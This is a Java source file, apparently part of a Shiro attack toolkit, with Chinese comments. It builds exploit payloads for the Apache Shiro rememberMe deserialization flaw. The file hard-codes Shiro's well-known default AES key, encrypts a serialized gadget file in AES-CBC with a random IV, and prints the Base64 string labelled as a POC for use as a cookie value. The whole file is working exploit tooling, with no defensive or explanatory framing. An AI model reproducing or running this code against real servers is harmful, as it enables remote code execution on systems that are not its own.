package org.example.ShiroAttack;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.security.SecureRandom;
import java.util.Base64;
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class EncPayload {
    public static byte[] encryptionCipherKey = Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");
    // 使用 ensureSecureRandom 生成随机 IV
    public static byte[] generateRandomIV(int sizeInBits) {
        int BITS_PER_BYTE = 8;
        int sizeInBytes = sizeInBits / BITS_PER_BYTE; // 将位数转为字节数
        byte[] ivBytes = new byte[sizeInBytes];
        SecureRandom random = ensureSecureRandom();
        random.nextBytes(ivBytes); // 生成随机字节的 IV
        return ivBytes;
    }

    // 确保使用安全的随机数生成器
    public static SecureRandom ensureSecureRandom() {
        return new SecureRandom(); // SecureRandom 通常用于密码学操作
    }

    // 加密方法
    public static byte[] encrypt(byte[] data) throws Exception {
        // 创建 AES 密钥规格
        SecretKeySpec secretKey = new SecretKeySpec(encryptionCipherKey, "AES");
        // 随机生成一个 16 字节（128 位）的 IV
        byte[] iv = generateRandomIV(128); // 生成的 IV 长度为 128 位（16 字节）
        IvParameterSpec ivParameterSpec = new IvParameterSpec(iv);
        // 获取 AES Cipher 实例，使用 CBC 模式和 PKCS5Padding 填充方式
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        // 初始化 Cipher 为加密模式，并传入密钥和 IV
        cipher.init(Cipher.ENCRYPT_MODE, secretKey, ivParameterSpec);
        byte[] encryptedData = cipher.doFinal(data);
        // 创建一个包含 IV 和加密数据的新数组
        byte[] output = new byte[iv.length + encryptedData.length];
        // 复制 IV 到输出数组的前 16 个字节
        System.arraycopy(iv, 0, output, 0, iv.length);
        // 复制加密数据到输出数组的后续部分
        System.arraycopy(encryptedData, 0, output, iv.length, encryptedData.length);
        // 返回包含 IV 和加密数据的字节数组
        return output;
    }

    public static byte[] readFileToByteArray(String filePath) throws IOException {
        File file = new File(filePath);
        byte[] byteArray = new byte[(int) file.length()]; // 根据文件大小初始化字节数组

        try (FileInputStream fis = new FileInputStream(file)) {
            int bytesRead = fis.read(byteArray); // 读取文件内容到字节数组
            if (bytesRead != byteArray.length) {
                throw new IOException("Could not completely read the file: " + filePath);
            }
        }
        return byteArray;
    }

    public static void getPOC(String fileName) throws Exception {
        byte[] bytes = encrypt(readFileToByteArray(fileName));
        System.out.println(Base64.getEncoder().encodeToString(bytes) + "\nPocLength:" + bytes.length);
    }
}
